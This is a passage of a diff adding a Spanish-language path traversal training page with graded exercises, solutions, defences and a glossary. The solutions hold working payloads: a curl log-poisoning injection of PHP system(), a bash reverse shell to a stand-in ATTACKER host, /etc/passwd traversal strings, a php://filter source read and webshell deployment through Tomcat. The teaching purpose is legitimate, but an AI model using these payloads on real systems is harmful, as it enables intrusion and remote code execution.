+    <p>Tienes un Path Traversal en PHP pero no puedes usar wrappers (estÃ¡n deshabilitados). El log de Apache es accesible. DiseÃ±a la cadena completa de log poisoning para obtener RCE.</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej5-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej5-hints" data-open="false"><div class="inner"><ol>
+        <li>Inyectar cÃ³digo PHP en un header (User-Agent, Referer).</li>
+        <li>El log guarda el header tal cual, sin escapar.</li>
+        <li>Incluir el log con el path traversal para ejecutar el cÃ³digo.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej5-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej5-sol" data-open="false"><div class="inner">
+        <p><strong>Cadena:</strong> 1) <code>curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://target/</code>. 2) Verificar que el PHP estÃ¡ en el log: <code>../../../var/log/apache2/access.log</code>. 3) Ejecutar: <code>?page=../../../var/log/apache2/access.log&amp;cmd=id</code>. 4) Obtener shell: <code>&amp;cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1'</code>.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej6" aria-labelledby="ej6-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej6-h">Ejercicio 6</p>
+      <span class="badge badge--med">Intermedio</span>
+      <span class="tag">Whitelist</span>
+    </header>
+    <p>El servidor valida que el parÃ¡metro <code>file</code> empiece por <code>/docs/</code>. Â¿CÃ³mo bypasses esta validaciÃ³n?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej6-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej6-hints" data-open="false"><div class="inner"><ol>
+        <li>La validaciÃ³n es al inicio de la cadena.</li>
+        <li><code>/docs/../../etc/passwd</code> empieza por <code>/docs/</code>.</li>
+        <li>El <code>../../</code> sale del directorio despuÃ©s de la validaciÃ³n.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej6-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej6-sol" data-open="false"><div class="inner">
+        <p><strong>Payload:</strong> <code>/docs/../../etc/passwd</code>. La validaciÃ³n ve <code>/docs/</code> al inicio y lo aprueba. El sistema de archivos resuelve <code>../../</code> y sale del directorio. <strong>La lecciÃ³n:</strong> la validaciÃ³n debe hacerse <em>despuÃ©s</em> de resolver la ruta completa, no antes.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej7" aria-labelledby="ej7-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej7-h">Ejercicio 7</p>
+      <span class="badge badge--high">Avanzado</span>
+      <span class="tag">Escritura</span>
+    </header>
+    <p>Un endpoint de upload acepta <code>/upload?path=uploads/</code>. El parÃ¡metro <code>path</code> controla el directorio de destino. Â¿CÃ³mo escribirÃ­as un archivo en una ubicaciÃ³n arbitraria?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej7-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej7-hints" data-open="false"><div class="inner"><ol>
+        <li><code>path=../../webapps/ROOT/</code> â†’ escribir en el directorio web.</li>
+        <li>El archivo podrÃ­a ser un JSP, PHP o HTML con JavaScript.</li>
+        <li>Si el servidor ejecuta el archivo, es RCE directo.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej7-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej7-sol" data-open="false"><div class="inner">
+        <p><strong>Escritura arbitraria:</strong> <code>/upload?path=../../webapps/ROOT/</code> con un archivo <code>shell.jsp</code> que contenga un webshell. <strong>Impacto:</strong> ejecuciÃ³n remota de cÃ³digo completa. <strong>MitigaciÃ³n:</strong> nunca confiar en el parÃ¡metro de ruta del cliente; usar un directorio fijo hardcodeado.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej8" aria-labelledby="ej8-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej8-h">Ejercicio 8</p>
+      <span class="badge badge--med">Intermedio</span>
+      <span class="tag">Null byte</span>
+    </header>
+    <p>La aplicaciÃ³n fuerza la extensiÃ³n <code>.jpg</code> al final de todo parÃ¡metro. Usando <code>%00</code>, Â¿cÃ³mo leerÃ­as un archivo arbitrario?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej8-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej8-hints" data-open="false"><div class="inner"><ol>
+        <li>En PHP anterior a 5.3.4, <code>%00</code> trunca la cadena.</li>
+        <li><code>../../etc/passwd%00.jpg</code> â†’ PHP lee hasta <code>%00</code>.</li>
+        <li>Esta vulnerabilidad estÃ¡ parcheada en versiones modernas.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej8-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej8-sol" data-open="false"><div class="inner">
+        <p><strong>Payload:</strong> <code>../../etc/passwd%00.jpg</code>. En PHP &lt; 5.3.4, el null byte trunca la cadena y <code>.jpg</code> nunca se aÃ±ade. <strong>Nota:</strong> parcheado desde 2010. Solo funciona en sistemas legacy sin actualizar. La lecciÃ³n: mantener el software actualizado es una mitigaciÃ³n efectiva.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej9" aria-labelledby="ej9-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej9-h">Ejercicio 9</p>
+      <span class="badge badge--med">Intermedio</span>
+      <span class="tag">Wrappers</span>
+    </header>
+    <p>En PHP, el parÃ¡metro <code>template</code> pasa por <code>include()</code>. Los wrappers <code>php://</code> estÃ¡n habilitados. Â¿CÃ³mo obtendrÃ­as el cÃ³digo fuente de <code>index.php</code>?</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej9-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej9-hints" data-open="false"><div class="inner"><ol>
+        <li><code>php://filter</code> permite leer archivos con filtros de conversiÃ³n.</li>
+        <li><code>convert.base64-encode</code> evita que el PHP se ejecute.</li>
+        <li>Decodificar el base64 da el cÃ³digo fuente.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej9-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej9-sol" data-open="false"><div class="inner">
+        <p><strong>Payload:</strong> <code>?template=php://filter/convert.base64-encode/resource=index.php</code>. PHP lee el archivo, lo codifica en base64 (evitando que se ejecute como PHP), y lo devuelve. Decodificar con <code>echo "PD9..." | base64 -d</code> da el cÃ³digo fuente completo.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej10" aria-labelledby="ej10-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej10-h">Ejercicio 10</p>
+      <span class="badge badge--high">Avanzado</span>
+      <span class="tag">Cadena completa</span>
+    </header>
+    <p>Encuentras Path Traversal en una app Java. Los logs de Tomcat son accesibles. No hay wrappers PHP. DiseÃ±a una cadena para obtener ejecuciÃ³n remota.</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej10-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej10-hints" data-open="false"><div class="inner"><ol>
+        <li>Tomcat tiene un manager que acepta WAR files.</li>
+        <li>Si puedes escribir un WAR en el directorio webapps, se despliega automÃ¡ticamente.</li>
+        <li>El path traversal debe ser de escritura, no solo de lectura.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej10-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej10-sol" data-open="false"><div class="inner">
+        <p><strong>Cadena en Java:</strong> 1) Confirmar Path Traversal leyendo <code>/etc/passwd</code>. 2) Buscar el directorio webapps: <code>/proc/self/cwd/</code> o <code>/usr/local/tomcat/webapps/</code>. 3) Escribir un WAR con un JSP webshell usando el Path Traversal de escritura. 4) Tomcat despliega el WAR automÃ¡ticamente. 5) Acceder al webshell: <code>/shell/cmd.jsp?cmd=id</code>.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej11" aria-labelledby="ej11-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej11-h">Ejercicio 11</p>
+      <span class="badge badge--high">Avanzado</span>
+      <span class="tag">Defensa</span>
+    </header>
+    <p>DiseÃ±a un sistema de defensa completo contra Path Traversal para una aplicaciÃ³n que acepta nombres de archivo del cliente. Incluye validaciÃ³n, resoluciÃ³n de ruta, aislamiento y monitoreo.</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej11-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej11-hints" data-open="false"><div class="inner"><ol>
+        <li>Whitelist de caracteres: solo <code>[a-zA-Z0-9._-]</code>.</li>
+        <li>ResoluciÃ³n con <code>path.resolve()</code> + verificaciÃ³n de prefijo.</li>
+        <li>Chroot o Docker para aislamiento del sistema de archivos.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej11-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej11-sol" data-open="false"><div class="inner">
+        <p><strong>Capa 1 - Entrada:</strong> whitelist <code>[a-zA-Z0-9._-]</code>, longitud mÃ¡x 64, sin <code>/</code> ni <code>\</code>. <strong>Capa 2 - ResoluciÃ³n:</strong> <code>path.resolve()</code> + startsWith() del directorio permitido. <strong>Capa 3 - Aislamiento:</strong> Docker con filesystem mÃ­nimo, usuario no-root, read-only donde sea posible. <strong>Capa 4 - Monitoreo:</strong> alertas en intentos de acceso a <code>/etc</code>, <code>/proc</code>, logs inusuales. <strong>Capa 5 - WAF:</strong> reglas para detectar patrones de traversal.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <section class="exercise" id="ej12" aria-labelledby="ej12-h">
+    <header class="exercise__head">
+      <p class="eyebrow" id="ej12-h">Ejercicio 12</p>
+      <span class="badge badge--high">Avanzado</span>
+      <span class="tag">Workflow completo</span>
+    </header>
+    <p>Tienes 45 minutos para auditar una aplicaciÃ³n web desconocida en busca de Path Traversal. DiseÃ±a tu plan de acciÃ³n, quÃ© herramientas usas, en quÃ© orden, y quÃ© criterios te llevan de la detecciÃ³n a la explotaciÃ³n.</p>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej12-hints"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18h6M10 22h4M15.09 14c.18-.98.65-1.74 1.41-2.5A4.65 4.65 0 0 0 18 8 6 6 0 0 0 6 8c0 1 .23 2.23 1.5 3.5.76.76 1.23 1.52 1.41 2.5"/></svg> Ver pistas <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej12-hints" data-open="false"><div class="inner"><ol>
+        <li>Primero mapear: quÃ© endpoints aceptan archivos o rutas.</li>
+        <li>DespuÃ©s probar payloads bÃ¡sicos en cada endpoint.</li>
+        <li>Si hay filtrado, intentar bypasses antes de descartar.</li>
+      </ol></div></div>
+    </div>
+    <div class="disclosure">
+      <button type="button" aria-expanded="false" aria-controls="ej12-sol"><svg class="lead" viewBox="0 0 24 24" aria-hidden="true"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 8.15-8.15M18 5l2 2M15 8l2 2"/></svg> Ver soluciÃ³n <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg></button>
+      <div class="disclosure__panel" id="ej12-sol" data-open="false"><div class="inner">
+        <p><strong>Plan de 45 min:</strong> 0-10 min: mapear endpoints con Burp Spider o ZAP. 10-20 min: probar <code>../</code> en cada parÃ¡metro. 20-30 min: si hay filtrado, intentar bypasses (encoding, doble encoding, barra invertida). 30-40 min: si hay Path Traversal, explotar: leer .env, cÃ³digo fuente, logs. 40-45 min: documentar hallazgos, intentar escalar si es posible.</p>
+      </div></div>
+    </div>
+  </section>
+
+  <aside class="callout callout--note" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg> Nota</p>
+    <p>El patrÃ³n en todos los ejercicios: <em>detectar â†’ explotar â†’ escalar</em>. El Path Traversal rara vez es el impacto final; es una puerta de entrada a filtraciÃ³n de datos, ejecuciÃ³n de cÃ³digo o compromiso total del servidor.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 10 ===================== -->
+<section class="section" id="s10" aria-labelledby="s10-h">
+  <h2 id="s10-h" tabindex="-1"><span class="sec-num">10</span>Glosario, referencias y recursos</h2>
+
+  <div class="block">
+    <p class="subhead">Glossario</p>
+    <h3>Glosario de tÃ©rminos</h3>
+    <dl class="glossary">
+      <dt>Path Traversal</dt><dd>Vulnerabilidad que permite acceder a archivos fuera del directorio raÃ­z manipulando rutas de archivo.</dd>
+      <dt>LFI</dt><dd>Local File Inclusion: incluir archivos locales del servidor vÃ­a path traversal o includes.</dd>
+      <dt>RFI</dt><dd>Remote File Inclusion: incluir archivos de servidores remotos controlados por el atacante.</dd>
+      <dt>Log poisoning</dt><dd>TÃ©cnica para inyectar cÃ³digo en logs del servidor y luego ejecutarlo vÃ­a inclusiÃ³n.</dd>
+      <dt>Null byte</dt><dd>CarÃ¡cter <code>%00</code> que truncaba cadenas en PHP &lt; 5.3.4, permitiendo bypass de extensiones.</dd>
+      <dt>Wrapper</dt><dd>Protocolo especial en PHP (<code>php://</code>, <code>file://</code>, <code>data://</code>) para acceder a recursos de forma no estÃ¡ndar.</dd>
+      <dt>SanitizaciÃ³n</dt><dd>Proceso de limpiar la entrada del usuario eliminando o codificando caracteres peligrosos.</dd>
+      <dt>Whitelist</dt><dd>Lista de caracteres o valores permitidos. Es la defensa mÃ¡s efectiva contra path traversal.</dd>
+      <dt>Chroot jail</dt><dd>Aislamiento del sistema de archivos donde la aplicaciÃ³n cree que <code>/</code> es otro directorio.</dd>
+      <dt>Webshell</dt><dd>Archivo malicioso (PHP, JSP, ASP) que permite ejecutar comandos remotamente desde el navegador.</dd>
+      <dt>CWE-22</dt><dd>ClasificaciÃ³n de debilidad: Improper Limitation of a Pathname to a Restricted Directory.</dd>
+      <dt>Double encoding</dt><dd>Codificar dos veces los caracteres especiales para evadir filtros que solo decodifican una vez.</dd>
+    </dl>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Recursos</p>
+    <h3>Herramientas y plataformas</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Recurso</th><th scope="col">Tipo</th><th scope="col">Enlace</th></tr></thead>
+        <tbody>
+          <tr><td>OWASP Testing Guide</td><td>MetodologÃ­a</td><td><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/" target="_blank" rel="noopener">owasp.org</a></td></tr>
+          <tr><td>PortSwigger Web Security Academy</td><td>Laboratorio gratuito</td><td><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener">portswigger.net</a></td></tr>
+          <tr><td>HackTheBox</td><td>MÃ¡quinas vulnerable</td><td><a href="https://www.hackthebox.com/" target="_blank" rel="noopener">hackthebox.com</a></td></tr>
+          <tr><td>TryHackMe</td><td>Rutas de aprendizaje</td><td><a href="https://tryhackme.com/" target="_blank" rel="noopener">tryhackme.com</a></td></tr>
+          <tr><td>cargo</td><td>Scanner de Path Traversal</td><td><a href="https://github.com/ACooper81/cargo" target="_blank" rel="noopener">github.com</a></td></tr>
+          <tr><td>LFI Suite</td><td>Herramienta de explotaciÃ³n LFI</td><td><a href="https://github.com/DamnWidget/LFISuite" target="_blank" rel="noopener">github.com</a></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Referencias</p>
+    <h3>Enlaces de referencia</h3>
+    <ol class="reflist">
+      <li><a href="https://cwe.mitre.org/data/definitions/22.html" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory</a></li>
+      <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" rel="noopener">OWASP: Path Traversal</a></li>
+      <li><a href="https://portswigger.net/web-security/file-path-traversal" rel="noopener">PortSwigger: File path traversal</a></li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Path_Traversal_Cheat_Sheet.html" rel="noopener">OWASP Path Traversal Cheat Sheet</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/98.html" rel="noopener">CWE-98: Improper Control of Filename for Include/Require Statement</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/434.html" rel="noopener">CWE-434: Unrestricted Upload of File with Dangerous Type</a></li>
+      <li><a href="https://www.w3.org/TR/WCAG22/" rel="noopener">W3C WCAG 2.2</a></li>
+    </ol>
+    <p class="prose" style="margin-top:var(--sp-5)"><span class="kbd">P</span> activa y recorre el modo proyecciÃ³n. El tema claro u oscuro se recuerda en este navegador.</p>
+  </div>
+</section>
+
+</section>
+
+<!-- ===================== FOOTER ===================== -->
+</main>
+</div>
+
+<script>
+(function () {
+  "use strict";
+  var root = document.documentElement;
+  var reduce = matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  var sections = [
+    ['s01', 'QuÃ© es el Path Traversal'],
+    ['s02', 'Tipos de Path Traversal'],
+    ['s03', 'TÃ©cnicas de bypass'],
+    ['s04', 'Herramientas de exploraciÃ³n'],
+    ['s05', 'ExplotaciÃ³n paso a paso'],
+    ['s06', 'Escenarios reales y casos de estudio'],
+    ['s07', 'PrevenciÃ³n y mitigaciÃ³n'],
+    ['s08', 'Caso prÃ¡ctico completo'],
+    ['s09', 'Ejercicios de Path Traversal'],
+    ['s10', 'Glosario, referencias y recursos']
+  ];
+  function buildToc(target, closeOnClick) {
+    var ol = document.getElementById(target);
+    if (!ol) return;
+    sections.forEach(function (s, i) {
+      var li = document.createElement('li');
+      var a = document.createElement('a');
+      a.href = '#' + s[0];
+      a.innerHTML = '<span class="toc__num">' + String(i + 1).padStart(2, '0') + '</span><span class="toc__label">' + s[1] + '</span>';
+      if (closeOnClick) a.addEventListener('click', closeDrawer);
+      li.appendChild(a);
+      ol.appendChild(li);
+    });
+  }
+  buildToc('toc-desktop', false);
+  buildToc('toc-mobile', true);
+  buildToc('toc-static', false);
+
+  function currentTheme() { return root.getAttribute('data-theme') || 'light'; }
+  function setTheme(t) {
+    root.setAttribute('data-theme', t);
+    try { localStorage.setItem('theme', t); } catch (e) {}
+    document.querySelectorAll('#theme-toggle, #theme-toggle-hero').forEach(function (b) {
+      b.setAttribute('aria-pressed', String(t === 'dark'));
+    });
+  }
+  setTheme(currentTheme());
+  document.querySelectorAll('#theme-toggle, #theme-toggle-hero').forEach(function (b) {
+    b.addEventListener('click', function () { setTheme(currentTheme() === 'dark' ? 'light' : 'dark'); });
+  });
+
+  var modes = ['', 'present', 'present-slides'];
+  function currentMode() { return root.getAttribute('data-mode') || ''; }
+  function setMode(m) {
+    if (m) root.setAttribute('data-mode', m); else root.removeAttribute('data-mode');
+    try { m ? localStorage.setItem('mode', m) : localStorage.removeItem('mode'); } catch (e) {}
+    document.querySelectorAll('#present-toggle, #present-toggle-hero').forEach(function (b) {
+      b.setAttribute('aria-pressed', String(!!m));
+    });
+  }
+  function cycleMode() {
+    var i = modes.indexOf(currentMode());
+    setMode(modes[(i + 1) % modes.length]);
+  }
+  document.querySelectorAll('#present-toggle, #present-toggle-hero').forEach(function (b) {
+    b.addEventListener('click', cycleMode);
+  });
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'p' || e.key === 'P') {
+      if (['INPUT', 'TEXTAREA'].indexOf(document.activeElement.tagName) === -1) cycleMode();
+    }
+  });
+
+  var header = document.querySelector('.header');
+  var progress = document.querySelector('.read-progress');
+  var ticking = false;
+  function onScroll() {
+    if (ticking) return;
+    ticking = true;
+    requestAnimationFrame(function () {
+      header.setAttribute('data-scrolled', String(window.scrollY > 4));
+      var h = document.documentElement.scrollHeight - window.innerHeight;
+      var pct = h > 0 ? Math.min(100, Math.round((window.scrollY / h) * 100)) : 0;
+      progress.style.width = pct + '%';
+      progress.setAttribute('aria-valuenow', String(pct));
+      ticking = false;
+    });
+  }
+  window.addEventListener('scroll', onScroll, { passive: true });
+  onScroll();
+
+  var links = {};
+  document.querySelectorAll('#toc-desktop a, #toc-mobile a').forEach(function (a) {
+    var id = a.getAttribute('href').slice(1);
+    (links[id] = links[id] || []).push(a);
+  });
+  if ('IntersectionObserver' in window) {
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (en) {
+        if (!en.isIntersecting) return;
+        var id = en.target.id;
+        Object.keys(links).forEach(function (k) {
+          links[k].forEach(function (a) {
+            if (k === id) a.setAttribute('aria-current', 'location');
+            else a.removeAttribute('aria-current');
+          });
+        });
+      });
+    }, { rootMargin: '-20% 0px -70% 0px' });
+    document.querySelectorAll('main .section').forEach(function (s) { io.observe(s); });
+  }
+
+  document.addEventListener('click', function (e) {
+    var a = e.target.closest('a[href^="#"]');
+    if (!a) return;
+    var id = a.getAttribute('href').slice(1);
+    var el = document.getElementById(id);
+    if (!el) return;
+    var h = el.matches('section') ? el.querySelector('h2') : el;
+    if (h && h.hasAttribute('tabindex') === false) h.setAttribute('tabindex', '-1');
+    setTimeout(function () { if (h) h.focus({ preventScroll: true }); }, reduce ? 0 : 320);
+  });
+
+  var drawer = document.getElementById('drawer');
+  var overlay = document.querySelector('.drawer-overlay');
+  var tocBtn = document.querySelector('.header__toc-btn');
+  var lastFocus = null;
+  function openDrawer() {
+    lastFocus = document.activeElement;
+    drawer.setAttribute('data-open', 'true');
+    overlay.setAttribute('data-open', 'true');
+    tocBtn.setAttribute('aria-expanded', 'true');
+    document.getElementById('drawer-close').focus();
+    document.addEventListener('keydown', onDrawerKey);
+  }
+  function closeDrawer() {
+    drawer.setAttribute('data-open', 'false');
+    overlay.setAttribute('data-open', 'false');
+    tocBtn.setAttribute('aria-expanded', 'false');
+    document.removeEventListener('keydown', onDrawerKey);
+    if (lastFocus) lastFocus.focus();
+  }
+  function onDrawerKey(e) {
+    if (e.key === 'Escape') { closeDrawer(); return; }
+    if (e.key !== 'Tab') return;
+    var f = drawer.querySelectorAll('a, button');
+    if (!f.length) return;
+    var first = f[0], last = f[f.length - 1];
+    if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
+    else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
+  }
+  tocBtn.addEventListener('click', openDrawer);
+  document.getElementById('drawer-close').addEventListener('click', closeDrawer);
+  overlay.addEventListener('click', closeDrawer);
+
+  document.addEventListener('click', function (e) {
+    var btn = e.target.closest('.code__copy');
+    if (!btn) return;
+    var pre = btn.closest('.code').querySelector('pre');
+    var text = pre ? pre.innerText : '';
+    var label = btn.querySelector('span');
+    function done(msg, state) {
+      if (label) label.textContent = msg;
+      btn.setAttribute('data-state', state);
+      setTimeout(function () { if (label) label.textContent = 'Copiar'; btn.removeAttribute('data-state'); }, 2000);
+    }
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(function () { done('Copiado', 'done'); }, function () { done('Copia manual', 'err'); });
+    } else {
+      var r = document.createRange(); r.selectNodeContents(pre);
+      var sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(r);
+      done('Selecciona y copia', 'err');
+    }
+  });
+
+  document.addEventListener('click', function (e) {
+    var btn = e.target.closest('.disclosure > button');
+    if (!btn) return;
+    var panel = document.getElementById(btn.getAttribute('aria-controls'));
+    var open = btn.getAttribute('aria-expanded') === 'true';
+    btn.setAttribute('aria-expanded', String(!open));
+    if (panel) panel.setAttribute('data-open', String(!open));
+  });
+})();
+</script>
+</body>
+</html>
+
